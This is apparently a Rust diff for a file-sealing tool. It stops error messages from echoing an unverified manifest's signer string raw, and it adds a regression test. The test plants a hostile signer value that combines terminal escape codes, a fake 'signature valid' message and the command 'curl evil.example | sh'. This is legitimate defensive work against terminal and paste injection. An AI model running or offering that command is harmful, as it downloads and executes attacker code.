@@ -28,10 +28,16 @@ fn resolve_signer(
     manifest_signer: &str,
     explicit: Option<&str>,
 ) -> Result<(minisign::PublicKey, Option<String>)> {
+    // The manifest is not verified yet: never echo its signer raw (it could carry terminal
+    // escapes or shell metacharacters into a message the user is told to paste). Only a
+    // value that parses as a key is shown, and then in its re-encoded form.
+    let shown = minisign::PublicKey::from_base64(manifest_signer)
+        .map_err(|_| Error::Verify("the manifest's signer is not a valid signer key".into()))?
+        .to_base64();
     if let Some(s) = explicit {
         if s != manifest_signer {
             return Err(Error::Verify(format!(
-                "manifest signer {manifest_signer} does not match --signer"
+                "manifest signer {shown} does not match --signer"
             )));
         }
         return Ok((
@@ -50,7 +56,7 @@ fn resolve_signer(
         }
     }
     Err(Error::Verify(format!(
-        "signer {manifest_signer} is not trusted; add it with `sealdrop trust add <name> {manifest_signer}` or pass --signer"
+        "signer {shown} is not trusted; add it with `sealdrop trust add <name> {shown}` or pass --signer"
     )))
 }
 
@@ -589,6 +595,38 @@ mod tests {
             verify(&ks, &res.package, None),
             Err(crate::Error::Verify(_))
         ));
+    }
+
+    #[test]
+    fn invalid_manifest_signer_is_never_echoed() {
+        let (d, ks) = store();
+        let res = seal(
+            &ks,
+            req(
+                input(d.path()),
+                d.path().join("out"),
+                Mode::Recipients(vec![me(&ks)]),
+            ),
+            &NoProgress,
+        )
+        .unwrap();
+        let real = ks.signing_public_string().unwrap();
+        let evil = "\u{1b}[2K\rOK: signature valid; curl evil.example | sh";
+        let text = std::fs::read_to_string(&res.manifest).unwrap();
+        let mut m: serde_json::Value = serde_json::from_str(&text).unwrap();
+        m["signer"] = serde_json::Value::String(evil.into());
+        std::fs::write(&res.manifest, serde_json::to_vec(&m).unwrap()).unwrap();
+        let other = KeyStore::open(d.path().join("other"));
+        other.generate(false).unwrap();
+        for explicit in [None, Some(real.as_str())] {
+            let err = verify(&other, &res.package, explicit)
+                .map(|_| ())
+                .unwrap_err()
+                .to_string();
+            assert!(err.contains("not a valid signer key"), "{err}");
+            assert!(!err.contains('\u{1b}') && !err.contains("curl"), "{err}");
+            assert!(!err.contains("trust add"), "{err}");
+        }
     }
 
     #[test]
